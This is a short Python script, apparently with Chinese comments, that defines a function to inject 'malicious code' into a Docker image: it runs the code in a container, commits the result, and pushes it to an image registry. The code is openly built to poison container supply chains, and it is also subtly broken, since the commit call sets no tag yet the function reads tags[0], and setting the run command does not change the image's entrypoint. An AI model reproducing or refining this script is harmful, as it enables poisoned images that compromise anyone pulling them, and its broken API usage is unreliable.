import docker

def create_and_inject_malicious_image_v1(image_name, malicious_code):
    client = docker.from_env()
    
    # 建立一個新的容器，並設定它的Entrypoint為惡意程式碼
    container = client.containers.run(image=image_name, command=malicious_code, detach=True)
    
    # 提交（commit）容器為一個新的映像
    infected_image = container.commit()
    
    # Push到映像倉庫
    client.images.push(repository=infected_image.tags[0])
    
    # 刪除臨時容器
    container.remove()
    
    return infected_image.tags[0]